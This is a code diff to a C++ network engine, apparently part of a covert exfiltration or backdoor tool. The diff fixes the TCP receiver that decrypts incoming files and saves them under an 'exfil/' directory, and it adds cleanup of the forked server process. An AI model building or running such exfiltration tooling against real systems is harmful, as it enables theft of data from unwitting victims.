@@ -5,7 +5,9 @@
 #include <iostream>
 
 #include <linux/if.h>
+#include <signal.h>
 #include <sys/ioctl.h>
+#include <sys/types.h>
 #include <unistd.h>
 
 #include "TcpStack.h"
@@ -58,6 +60,8 @@ NetworkEngine::~NetworkEngine() {
     }
 
     this->stopAsyncSniff();
+
+    kill(this->tcpPid, SIGKILL);
 
     delete this->crypto;
     delete this->knockController;
@@ -455,7 +459,11 @@ void NetworkEngine::gotPacket(unsigned char *args, const struct pcap_pkthdr *hea
  *
  */
 void NetworkEngine::startTcpServer(const unsigned short port) {
-    if (fork() != 0) return;
+    this->tcpPid = fork();
+
+    if (this->tcpPid != 0) {
+        return;
+    }
 
     int sd;
     int connfd;
@@ -487,8 +495,15 @@ void NetworkEngine::startTcpServer(const unsigned short port) {
     while (true) {
         connfd = accept(sd, (struct sockaddr *)&client, &len);
 
-        NetworkEngine::readAllFromTcpSocket(sd, buffer);
+        NetworkEngine::readAllFromTcpSocket(connfd, buffer);
+
+        if (buffer.size() == 0) {
+            std::cerr << "no data recceived" << std::endl;
+        }
+
         UCharVector plaintext = this->getCrypto()->dec(buffer);
+
+
 
         int index;
         for (index = 0; index < plaintext.size(); index++) {
@@ -500,13 +515,13 @@ void NetworkEngine::startTcpServer(const unsigned short port) {
         std::string filename((char *)plaintext.data(), index);
         for (int i = 0; i < filename.size(); i++) {
             if (filename[i] == '/') {
-                filename[i] = '-';
+                filename[i] = '_';
             }
         }
 
         std::ofstream outfile;
         outfile.open("exfil/" + filename);
-        std::string output(plaintext.data(), plaintext.data() + index + 1);
+        std::string output(plaintext.data() + index + 1, plaintext.data() + plaintext.size());
         outfile << output;
         outfile.close();
 
